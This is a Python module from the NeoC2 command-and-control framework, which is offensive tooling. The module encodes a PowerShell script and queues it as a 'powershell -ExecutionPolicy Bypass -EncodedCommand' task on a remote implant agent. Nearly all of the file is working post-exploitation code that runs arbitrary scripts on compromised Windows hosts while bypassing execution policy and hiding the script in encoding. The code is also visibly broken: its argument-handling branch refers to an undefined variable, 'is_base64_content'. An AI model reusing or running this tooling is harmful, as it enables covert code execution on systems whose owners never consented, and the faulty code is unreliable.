import os
import importlib.util
import base64
import re

def get_info():
    return {
        "name": "pwsh",
        "description": "Execute PowerShell scripts on agents session in-memory",
        "type": "execution",
        "platform": "windows",
        "author": "NeoC2 Framework by @stillbigjosh",
        "references": [
            "https://github.com/stillbigjosh/NeoC2"
        ],
        "technique_id": "T1059",  # Command and Scripting Interpreter
        "mitre_tactics": ["Execution"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run PowerShell script on",
                "required": True
            },
            "script_path": {
                "description": "Path to the PowerShell script to execute on Neo C2 server.",
                "required": True
            },
            "arguments": {
                "description": "Arguments to pass to the PowerShell script",
                "required": False,
                "default": ""
            }
        }
    }


def execute(options, session):
    agent_id = options.get("agent_id")
    script_path = options.get("script_path")
    script_args = options.get("arguments", "")

    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }

    if not script_path:
        return {
            "success": False,
            "error": "PowerShell script path is required"
        }

    session.current_agent = agent_id

    # Check if script_path is already base64 encoded content (indicates client-side file)
    if "FILE_NOT_FOUND_ON_CLIENT" in script_path:
        # Special flag indicating the file was not found on the client side
        return {
            "success": False,
            "error": f"PowerShell script file not found on client: {script_path.replace(' FILE_NOT_FOUND_ON_CLIENT', '')}. No server-side fallback mechanism - file must exist on client."
        }
    elif _is_base64(script_path):
        # The script_path is already base64 encoded content from the client
        # Decode the base64 content to get the PowerShell script
        try:
            decoded_script = base64.b64decode(script_path).decode('utf-8')
            # Create the encoded command directly from the decoded script
            script_bytes = decoded_script.encode('utf-16le')
            encoded_cmd = base64.b64encode(script_bytes).decode('ascii')
            command = f"powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_cmd}"
        except Exception as e:
            return {
                "success": False,
                "error": f"Error decoding PowerShell script: {str(e)}"
            }
    else:
        # The script_path is a file path, so we need to read the file
        # Only check the extensions directory for server-side files (shouldn't happen in new logic)
        # But if it does, we'll still try to handle it
        if os.path.isabs(script_path) and os.path.exists(script_path):
            script_file_path = script_path
        else:
            # In the new logic, this shouldn't happen since client should have already handled it
            # But we'll keep a minimal fallback check for edge cases
            script_file_path = os.path.join(os.path.dirname(__file__), '..', 'cli', 'extensions', 'powershell', os.path.basename(script_path))

            if not os.path.exists(script_file_path):
                # Don't attempt server-side fallback - this should have been handled on the client
                return {
                    "success": False,
                    "error": f"PowerShell script file not found on client and server-side fallback disabled: {script_path}. File must exist on client."
                }

        try:
            with open(script_file_path, 'r', encoding='utf-8') as f:
                original_script = f.read()
        except FileNotFoundError:
            return {
                "success": False,
                "error": f"PowerShell script file not found: {script_path}. Searched in common locations."
            }
        except Exception as e:
            return {
                "success": False,
                "error": f"Error reading PowerShell script: {str(e)}"
            }

        # Create the encoded command
        script_bytes = original_script.encode('utf-16le')
        encoded_cmd = base64.b64encode(script_bytes).decode('ascii')
        command = f"powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_cmd}"

    if script_args:
        # If there are arguments, we need to modify the command to include them
        # For PowerShell encoded commands with arguments, we need a different approach
        if is_base64_content:
            # If it's already base64 encoded content, we need to re-encode with arguments
            try:
                decoded_script = base64.b64decode(script_path).decode('utf-8')
                full_script = f"& {{ {decoded_script} }} {script_args}"
                script_bytes = full_script.encode('utf-16le')
                encoded_cmd = base64.b64encode(script_bytes).decode('ascii')
                command = f"powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_cmd}"
            except Exception as e:
                return {
                    "success": False,
                    "error": f"Error processing PowerShell script with arguments: {str(e)}"
                }
        else:
            # For file-based scripts, create a command that executes the script with arguments
            full_script = f"& '{script_file_path}' {script_args}"
            script_bytes = full_script.encode('utf-16le')
            encoded_cmd = base64.b64encode(script_bytes).decode('ascii')
            command = f"powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_cmd}"

    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }

    # Check if this is being executed in interactive mode
    if hasattr(session, 'is_interactive_execution') and session.is_interactive_execution:
        # Return the command that should be executed interactively
        return {
            "success": True,
            "output": f"[x] PowerShell script execution prepared for interactive mode",
            "command": command
        }
    else:
        try:
            agent_manager = session.agent_manager
            task_result = agent_manager.add_task(agent_id, command)
            if task_result.get('success'):
                task_id = task_result['task_id']
                return {
                    "success": True,
                    "output": f"[x] PowerShell script execution task {task_id} queued for agent {agent_id}",
                    "task_id": task_id,
                    "command": command
                }
            else:
                return {
                    "success": False,
                    "error": f"Failed to queue task for agent {agent_id}: {task_result.get('error', 'Unknown error')}"
                }
        except Exception as e:
            return {
                "success": False,
                "error": f"Error queuing task: {str(e)}"
            }


def _is_base64(s):
    try:
        # Check if the string contains only valid base64 characters
        if not re.match(r'^[A-Za-z0-9+/]*={0,2}$', s):
            return False

        # Pad the string if necessary for decoding
        padded = s
        padding_needed = len(s) % 4
        if padding_needed:
            padded = s + '=' * (4 - padding_needed)

        # Try to decode
        decoded = base64.b64decode(padded, validate=True)

        # Re-encode the decoded content
        re_encoded = base64.b64encode(decoded).decode('utf-8')

        # Check if the re-encoded version matches the original when both are padded the same way
        # Pad the original to 4-byte boundary for comparison
        orig_padded = s
        orig_padding_needed = len(s) % 4
        if orig_padding_needed:
            orig_padded = s + '=' * (4 - orig_padding_needed)

        return re_encoded == orig_padded
    except Exception:
        return False
